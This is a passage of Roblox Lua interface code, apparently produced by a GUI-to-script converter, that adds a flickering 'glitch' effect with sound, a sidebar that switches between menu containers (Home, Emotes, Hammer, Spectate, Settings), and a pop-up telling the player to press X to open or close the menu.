	local frame = script.Parent
	local TweenService = game:GetService("TweenService")
	local Debris = game:GetService("Debris")
	
	-- Settings
	local glitchTime = 0.08
	local glitchStrength = 1
	local colours = {Color3.fromRGB(0,255,0), Color3.fromRGB(255,0,0)}
	local minDelay, maxDelay = 55, 88 -- rarer (25–40 seconds between glitches)
	
	-- Sound
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://120409669161365"
	sound.Volume = 0.2
	sound.Parent = frame
	
	-- one flicker
	local function doOneGlitch()
		if not frame.Visible then return end
	
		local clone = frame:Clone()
		clone.Parent = frame.Parent
		clone.ZIndex = frame.ZIndex + 1
		clone.BackgroundColor3 = colours[math.random(1,#colours)]
	
		clone.Position = frame.Position + UDim2.new(0, math.random(-glitchStrength, glitchStrength), 0, math.random(-glitchStrength, glitchStrength))
	
		TweenService:Create(clone, TweenInfo.new(glitchTime), {BackgroundTransparency = 1}):Play()
		Debris:AddItem(clone, glitchTime + 0.1)
	end
	
	-- glitch sequence (lasts whole sound length)
	local function startGlitch()
		if not frame.Visible then return end
	
		-- play sound
		sound:Play()
	
		local duration = sound.TimeLength
		local startTime = tick()
		while tick() - startTime < duration do
			-- more chaotic during sound
			for i = 1, math.random(1,3) do
				doOneGlitch()
			end
			task.wait(math.random(1,3) * glitchTime)
		end
	end
	
	-- loop
	while true do
		task.wait(math.random(minDelay, maxDelay)) -- wait longer between glitches
		startGlitch()
	end
	
end
coroutine.wrap(DESFK_fake_script)()
local function BQLX_fake_script() -- Frame_15.Buttons script 
	local script = Instance.new('LocalScript', Frame_15)

	local TweenService = game:GetService("TweenService")
	local Debris = game:GetService("Debris")
	
	-- Navigate from script to MAIN > Frame
	local buttonFrame = script.Parent
	local sidebarFrame = buttonFrame.Parent
	local sidebar = sidebarFrame.Parent
	local mainGui = sidebar.Parent
	local containerParent = mainGui:FindFirstChild("Frame")
	
	if not containerParent then
		warn("[ERROR] MAIN.Frame not found")
		return
	else
		print("[INFO] Found MAIN.Frame")
	end
	
	-- Button-to-container mapping
	local buttonToContainer = {
		AHome = "Container",
		Emotes = "Container2",
		Hammer = "Container3",
		Spectate = "Container4",
		xSetting = "Container5"
	}
	
	local clickSoundId = "rbxassetid://6042053626"
	local clickVolume = 0.2
	
	-- Play click sound
	local function playClickSound(parent)
		local sound = Instance.new("Sound")
		sound.SoundId = clickSoundId
		sound.Volume = clickVolume
		sound.Parent = parent
		sound:Play()
		Debris:AddItem(sound, 1)
		print("[INFO] Played click sound on", parent.Name)
	end
	
	-- Animate button press safely
	local function animateButton(button)
		if not button or not button:IsA("GuiObject") then
			warn("[ERROR] Invalid button passed to animateButton")
			return
		end
	
		local info = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local originalSize = button.Size
	
		local shrinkSize = UDim2.new(
			originalSize.X.Scale * 0.9, originalSize.X.Offset * 0.9,
			originalSize.Y.Scale * 0.9, originalSize.Y.Offset * 0.9
		)
	
		local tweenDown = TweenService:Create(button, info, {Size = shrinkSize})
		tweenDown:Play()
		tweenDown.Completed:Wait()
	
		local tweenUp = TweenService:Create(button, info, {Size = originalSize})
		tweenUp:Play()
	
		print("[INFO] Animated button:", button.Name)
	end
	
	-- Show only the clicked container, hide all others
	local function openContainer(buttonName)
		for name, containerName in pairs(buttonToContainer) do
			local container = containerParent:FindFirstChild(containerName)
			if container then
				container.Visible = (name == buttonName)
				print("[INFO] Container", containerName, "Visible =", container.Visible)
			else
				warn("[ERROR] Missing container:", containerName)
			end
		end
	end
	
	-- Connect each button to its behavior
	for buttonName, _ in pairs(buttonToContainer) do
		local button = buttonFrame:FindFirstChild(buttonName)
		if not button then
			warn("[ERROR] Button not found:", buttonName)
			continue
		else
			print("[INFO] Found button:", buttonName)
		end
	
		if button:IsA("ImageButton") then
			button.Active = true
			button.Selectable = true
		end
	
		button.MouseButton1Click:Connect(function()
			print("[DEBUG] Clicked:", buttonName)
	
			local targetContainer = containerParent:FindFirstChild(buttonToContainer[buttonName])
			if not targetContainer then
				warn("[ERROR] Target container not found for button:", buttonName)
				return
			end
	
			if targetContainer.Visible then
				print("[INFO] Container already visible:", targetContainer.Name)
				return
			end
	
			animateButton(button)
			playClickSound(button)
			openContainer(buttonName)
		end)
	end
end
coroutine.wrap(BQLX_fake_script)()
local function DSSI_fake_script() -- ScreenGui.notification 
	local script = Instance.new('LocalScript', ScreenGui)

	-- LocalScript inside ScreenGui (or anywhere in PlayerGui)
	wait(5)
	
	local StarterGui = game:GetService("StarterGui")
	
	StarterGui:SetCore("SendNotification", {
		Title = "Controls",
		Text = "Press X to OPEN/CLOSE",
		Duration = 5
	})
	
end
coroutine.wrap(DSSI_fake_script)()
